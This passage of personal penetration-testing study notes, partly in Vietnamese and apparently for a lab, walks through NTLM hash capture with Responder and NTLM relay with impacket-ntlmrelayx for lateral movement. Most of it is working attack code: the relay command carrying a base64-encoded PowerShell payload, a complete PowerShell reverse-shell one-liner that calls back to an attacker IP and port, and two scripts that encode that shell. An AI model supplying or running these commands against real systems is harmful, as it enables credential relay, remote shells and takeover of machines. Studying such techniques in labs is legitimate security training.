Kali : sudo responder -I tun0
Victim : dir \\192.168.119.2\test
```

If we cant crack it we cant then use Relaying NTLM (the IP is the target that we want to lateral movement to) : 

### Bước 1 — Setup `ntlmrelayx` (trên máy attacker)

```bash
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
```

- `t 192.168.50.212` → đây là **target muốn lateral movement tới** (máy B), không phải máy đang có shell
- `c "..."` → lệnh sẽ chạy trên máy B nếu relay thành công (ở đây là reverse shell PowerShell, base64-encoded)
- `-no-http-server` → tắt vì chỉ relay qua SMB
- `smb2support` → hỗ trợ SMB2

→ Lúc này `ntlmrelayx` đang **chờ sẵn**, chưa làm gì cả.

```jsx
$client = New-Object System.Net.Sockets.TCPClient('192.168.119.2',8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```jsx
echo -n '$client = New-Object System.Net.Sockets.TCPClient(...)...' | iconv -t UTF-16LE | base64 -w 0
```

OR : 

```jsx
python3 -c "
import base64
cmd = '''\$client = New-Object System.Net.Sockets.TCPClient('192.168.119.2',8080);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()'''
print(base64.b64encode(cmd.encode('utf_16_le')).decode())
"
```

